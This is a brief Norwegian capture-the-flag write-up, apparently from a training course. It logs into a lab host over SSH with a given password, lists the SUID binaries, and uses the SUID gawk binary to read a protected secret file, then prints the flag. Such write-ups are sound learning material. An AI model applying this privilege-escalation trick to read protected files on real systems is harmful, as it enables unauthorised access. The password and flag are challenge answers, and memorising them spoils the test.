# Unchained

Koble til med SSH med passord: `EnergiskSkjorte`

```sh
ssh support@unchained
```
--------------------------------------------
```sh
login@corax ~/1_grunnleggende/1.6_Unchained $ ssh support@unchained
Warning: Permanently added 'unchained' (ED25519) to the list of known hosts.
support@unchained's password:
unchained:~$ find / -perm -4000 2>/dev/null
/bin/busybox
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/gawk
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/sudo
```

gawk har suid, og kan lese secret.txt med feks print

```sh
unchained:~$ gawk '{print}' secret.txt
8c96a002cbd51d268f2ef3c73edadd5b
unchained:~$
```

Flagget er 8c96a002cbd51d268f2ef3c73edadd5b.